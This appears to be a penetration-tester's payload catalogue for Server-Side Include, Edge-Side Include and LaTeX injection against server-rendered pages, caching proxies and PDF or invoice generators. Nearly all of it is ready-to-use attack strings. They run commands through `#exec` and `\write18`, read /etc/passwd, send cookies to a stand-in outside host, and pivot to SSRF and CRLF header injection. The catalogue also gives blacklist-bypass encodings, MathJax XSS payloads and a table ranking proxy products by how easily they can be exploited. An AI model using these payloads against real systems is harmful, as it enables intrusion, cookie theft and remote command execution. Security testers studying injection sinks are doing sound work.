# SSI / ESI / LaTeX include-and-markup injection — Open WHEN: every template syntax renders literally but the value still reaches a server renderer (an `.shtml` page, a caching proxy/CDN, or a PDF / invoice / report generator)

These are sibling sinks to SSTI: the same routing evidence (user text rendered
into a server-built page, document, or message) but a non-template engine does
the rendering. The body has the quick probes; this file is the full catalogue.

## Server-Side Includes (SSI)
Directive form: `<!--#directive param="value" -->`. Evaluated by Apache
`mod_include` / nginx SSI on pages served as `.shtml` (or any handler with
`Options +Includes`). Classic spot: a reflected value (search term, name,
header) lands inside server-rendered HTML.

### Detection → escalation
| Goal                    | Directive |
|-------------------------|-----------|
| Print a date (probe)    | `<!--#echo var="DATE_LOCAL" -->` |
| Print document name     | `<!--#echo var="DOCUMENT_NAME" -->` |
| Dump all variables      | `<!--#printenv -->` |
| Set a variable          | `<!--#set var="name" value="Rich" -->` |
| Include a local file    | `<!--#include file="/etc/passwd" -->` |
| Include by URI          | `<!--#include virtual="/index.html" -->` |
| Remote include (SSRF)   | `<!--#include virtual="http://OOB.example.net/" -->` |
| Execute a command       | `<!--#exec cmd="id" -->` |
| File-size / last-mod    | `<!--#fsize file="ssi.shtml" -->`, `<!--#flastmod virtual="echo.html" -->` |

Useful `echo var=` values for recon (full list is large): `document_root`,
`http_user_agent`, `http_cookie`, `remote_addr`, `server_software`,
`query_string`, `script_filename`, `path_translated`, `auth_type`, `remote_user`.

Non-destructive RCE PoC: `<!--#exec cmd="id" -->` or `<!--#exec cmd="uname" -->`
(prefer over the back-channel one-liners). Time-based blind probe:
`<!--#exec cmd="sleep 5" -->` — diff against a no-payload baseline.

## Edge-Side Includes (ESI)
Caching surrogates (CDN/reverse-proxy) cannot tell an upstream ESI tag from one
injected into the HTTP response body, so reflected `<esi:...>` markup is
processed by the proxy. This turns reflection into SSRF (the proxy fetches your
URL), file disclosure, or XSS. Some surrogates require the upstream to opt in
with `Surrogate-Control: content="ESI/1.0"`.

| Goal                  | Markup |
|-----------------------|--------|
| Blind detection (OOB) | `<esi:include src="http://OOB.example.net/">` |
| SSRF / remote fetch   | `<esi:include src="http://internal-host/">` |
| Local file read       | `<esi:include src="supersecret.txt">` |
| XSS via include       | `<esi:include src="http://OOB.example.net/XSSPAYLOAD.html">` |
| Cookie exfil          | `<esi:include src="http://OOB.example.net/?c=$(HTTP_COOKIE)">` |
| Debug info            | `<esi:debug/>` |
| Add header            | `<!--esi $add_header('Location','http://OOB.example.net/') -->` |
| Inline fragment (XSS) | `<esi:inline name="/x.html" fetchable="yes"><script>prompt(1)</script></esi:inline>` |

A received OOB callback confirms ESI even with no visible reflection. The `src`
can carry CRLF for header injection / request smuggling, e.g.
`<esi:include src="http://host%0d%0aX-Forwarded-For:%20127.0.0.1/"/>`.

### Per-surrogate capability (what is reachable depends on the software)
| Software         | Includes | Vars | Cookies | Needs upstream header | Host whitelist |
|------------------|----------|------|---------|-----------------------|----------------|
| Squid3           | Yes | Yes | Yes | Yes | No |
| Varnish Cache    | Yes | No  | No  | Yes | Yes |
| Fastly           | Yes | No  | No  | No  | Yes |
| Akamai ETS       | Yes | Yes | Yes | No  | No |
| NodeJS `esi`     | Yes | Yes | Yes | No  | No |
| NodeJS `nodesi`  | Yes | No  | No  | No  | Optional |

No-whitelist surrogates (Squid3, Akamai ETS, NodeJS `esi`) are the easiest SSRF
pivots; `Vars: Yes` rows (Squid3, Akamai, `esi`) let you read `$(HTTP_COOKIE)`
and other request variables.

## LaTeX injection
User text compiled into a `.tex` document — common in PDF / invoice / report /
certificate generators. Severity depends on whether the LaTeX runner has
`--shell-escape` enabled (gates `\write18` command execution).

### File read (no shell-escape needed)
```tex
\input{/etc/passwd}                 % read + interpret as LaTeX
\include{somefile}                  % loads somefile.tex
\lstinputlisting{/etc/passwd}       % multi-line listing (needs \usepackage{listings})
\verbatiminput{/etc/passwd}         % raw paste, no interpretation (needs verbatim pkg)
```
Single-line read primitive (works without extra packages):
```tex
\newread\file \openin\file=/etc/issue \read\file to\line \text{\line} \closein\file
```

### Command execution (only with `--shell-escape`)
Output goes to stdout, so redirect to a temp file then read it back:
```tex
\immediate\write18{id > o}\input{o}
\immediate\write18{env | base64 > o.tex}\input{o.tex}   % base64 avoids LaTeX-breaking chars
\input|ls|base64
\input{|"/bin/hostname"}
```
Non-destructive PoC: `\immediate\write18{id > o}\input{o}` (reads `id`, mutates
nothing on the target).

### Filter / blacklist bypasses
- **Past the header** (`\usepackage` unavailable) — disable active catcodes so
  `\input` survives `$ # _ &` in the target file:
  `\catcode\`\$=12 \catcode\`\#=12 \catcode\`\_=12 \catcode\`\&=12 \input{path}`.
- **Charless / encoded command names** — replace any char with `^^<hex>`
  (`^^41`=`A`, `^^7e`=`~`; the hex letter must be lowercase):
  `\lstin^^70utlisting{/etc/passwd}` is `\lstinputlisting{...}`.
- **Write a file then load it**:
  `\newwrite\o \openout\o=c.tex \write\o{...} \closeout\o`.

### LaTeX → XSS (when the renderer is MathJax / client-side)
```tex
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
\unicode{<img src=1 onerror=alert(1)>}   % MathJax unicode extension
```
